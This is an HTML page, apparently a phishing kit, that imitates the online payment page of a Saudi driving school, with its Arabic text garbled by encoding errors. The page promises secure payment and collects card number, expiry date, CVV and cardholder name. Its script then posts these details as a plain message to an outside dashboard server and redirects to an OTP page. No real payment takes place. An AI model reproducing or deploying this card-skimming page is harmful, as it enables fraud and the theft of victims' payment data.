<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ø¯Ù„Ø© Ù„ØªØ¹Ù„ÙŠÙ… Ø§Ù„Ù‚ÙŠØ§Ø¯Ø© - Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</title>
  <style>
    body {font-family: "Tahoma", Arial, sans-serif; background: #f8f8f8; margin: 0; padding: 0;}
    .container {max-width: 420px; margin: 30px auto; background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; padding: 20px;}
    .logo { text-align: center; margin-bottom: 10px; }
    .logo img { max-width: 180px; width: 100%; height: auto; }
    h2 { font-size: clamp(16px, 2vw, 18px); text-align: center; margin: 15px 0; }
    .secure { background: #e6f4e6; padding: 8px; border-radius: 6px; font-size: clamp(12px, 2vw, 14px); text-align: center; margin-bottom: 15px; color: #2b7a2b; }
    .cards { text-align: center; margin-bottom: 20px; }
    .cards img { width: 45px; margin: 0 5px; max-width: 20%; height: auto; }
    .amounts {display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 15px;}
    .amounts label {display: block; padding: 10px; border: 1px solid #ccc; border-radius: 6px; cursor: pointer; text-align: center; font-size: 14px; background: #fafafa; transition: 0.3s;}
    .amounts input { margin-left: 6px; }
    .amounts label:hover { background: #f0f0f0; }
    .form-group { margin-bottom: 15px; }
    .form-group input {width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; font-size: 14px; box-sizing: border-box;}
    .row { display: flex; gap: 10px; }
    .row .form-group { flex: 1; }
    .submit-btn {width: 100%; background: #2b7a2b; color: #fff; font-size: 16px; padding: 12px; border: none; border-radius: 6px; cursor: pointer;}
    .submit-btn:hover { background: #256a25; }
    .card-preview { margin: 20px 0; display: flex; justify-content: center; }
    .card {width: 100%; max-width: 340px; height: 200px; border-radius: 15px; background: #001f6b; color: white; padding: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); display: flex; flex-direction: column; justify-content: space-between;}
    .card-header { display: flex; align-items: center; justify-content: space-between; }
    .chip { width: 40px; max-width: 20%; }
    .nfc { width: 28px; margin-left: 8px; }
    .bank-logo {background: radial-gradient(circle, #00bfff, #004488); color: #fff; padding: 5px 9px; border-radius: 50%; font-size: 12px; font-weight: bold;}
    .card-body { margin-top: 10px; }
    .card-name { font-size: clamp(14px, 2vw, 16px); margin-bottom: 8px; }
    .card-number {font-size: clamp(16px, 4vw, 20px); letter-spacing: 3px; font-family: "Courier New", monospace; direction: ltr; unicode-bidi: plaintext;}
    .card-footer { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
    .cvv-box, .expiry-box {border: 1px solid #ccc; padding: 4px 10px; font-size: 13px; background: #fff; color: #000; border-radius: 4px; min-width: 55px; text-align: center; margin: 3px;}
    .logos img { width: 35px; margin-left: 6px; }
    footer { text-align: center; padding: 15px; font-size: 13px; color: #555; }
    @media (max-width: 360px) {
      .card { height: 180px; padding: 15px; }
      .card-number { font-size: 14px; }
      .logos img { width: 28px; }
    }
    #inputNumber { direction: rtl; unicode-bidi: plaintext; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="images/sdadLogo.jpeg" alt="Dallah Driving"></div>
    <h2>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</h2>
    <div class="secure">Ø¯ÙØ¹ Ø¢Ù…Ù† %100 ... Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù…Ø¹Ù†Ø§ ÙÙŠ Ø­Ù…Ø§ÙŠØ© ÙˆØ£Ù…Ø§Ù†</div>

    <div class="cards">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">
      <img src="images/mada.png" alt="Mada">
    </div>

    <div class="amounts">
      <label><input type="radio" name="amount" value="500"> 500 Ø±ÙŠØ§Ù„ Ø³Ø¹ÙˆØ¯ÙŠ</label>
      <label><input type="radio" name="amount" value="650"> 650 Ø±ÙŠØ§Ù„ Ø³Ø¹ÙˆØ¯ÙŠ</label>
      <label><input type="radio" name="amount" value="1200"> 1200 Ø±ÙŠØ§Ù„ Ø³Ø¹ÙˆØ¯ÙŠ</label>
      <label><input type="radio" name="amount" value="1450" checked> 1450 Ø±ÙŠØ§Ù„ Ø³Ø¹ÙˆØ¯ÙŠ</label>
      <label><input type="radio" name="amount" value="2750"> 2750 Ø±ÙŠØ§Ù„ Ø³Ø¹ÙˆØ¯ÙŠ</label>
    </div>

    <div class="card-preview">
      <div class="card">
        <div class="card-header">
          <img src="https://img.icons8.com/color/48/000000/sim-card-chip.png" class="chip">
          <img src="https://img.icons8.com/ios-filled/40/ffffff/nfc-n.png" class="nfc">
          <div class="bank-logo">BANK</div>
        </div>
        <div class="card-body">
          <div class="card-name" id="cardName">Ø§Ù„Ø§Ø³Ù… Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>
          <div class="card-number" id="cardNumber">#### #### #### ####</div>
        </div>
        <div class="card-footer">
          <div class="cvv-box" id="cardCVV">CVV</div>
          <div class="expiry-box" id="cardExpiry">MM/YY</div>
          <div class="logos"></div>
        </div>
      </div>
    </div>

    <div class="form-group"><input type="text" id="inputNumber" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" maxlength="19"></div>
    <div class="row">
      <div class="form-group"><input type="text" id="inputExpiry" placeholder="ØªØ§Ø±ÙŠØ® Ø§Ù„Ø¥Ù†ØªÙ‡Ø§Ø¡ (MM/YY)" maxlength="5"></div>
      <div class="form-group"><input type="text" id="inputCVV" placeholder="CVV" maxlength="3"></div>
    </div>
    <div class="form-group"><input type="text" id="inputName" placeholder="Ø§Ù„Ø§Ø³Ù… Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©"></div>
    <button class="submit-btn" id="payBtn">ØªØ³Ø¯ÙŠØ¯</button>
  </div>

  <footer class="footer">
    <img src="images/circleLogo.jpeg" alt="Footer Logo" class="footer-logo">
    <p>Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø© Ù„Ø´Ø±ÙƒØ© Ø¯Ù„Ù‡ Ù„ØªØ¹Ù„ÙŠÙ… Ø§Ù„Ù‚ÙŠØ§Ø¯Ø© Â© 2025</p>
  </footer>

<script>
document.getElementById("payBtn").addEventListener("click", async () => {
  const amount = document.querySelector("input[name='amount']:checked")?.value || "";

  const message = `
  ğŸ’³ Ø¨Ø·Ø§Ù‚Ø© Ø¬Ø¯ÙŠØ¯Ø©:
  Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: ${inputNumber.value}
  ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡: ${inputExpiry.value}
  CVV: ${inputCVV.value}
  Ø§Ù„Ø§Ø³Ù…: ${inputName.value}
  Ø§Ù„Ù…Ø¨Ù„Øº: ${amount} Ø±ÙŠØ§Ù„
  `;

  try {
    const res = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: message })
    });

    const responseText = await res.text();
    console.log("ğŸ” Response status:", res.status);
    console.log("ğŸ” Response text:", responseText);

    if (res.ok) {
      alert("âœ… ØªÙ… Ø§Ù„Ø¯ÙØ¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­");
      window.location.href = "otp.html";
    } else {
      alert(`âŒ Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø®Ø§Ø¯Ù… (status: ${res.status}):\n${responseText}`);
    }
  } catch (err) {
    console.error("ğŸš¨ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", err);
    alert("âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„\n" + err.message);
  }
});
</script>

</body>
</html>
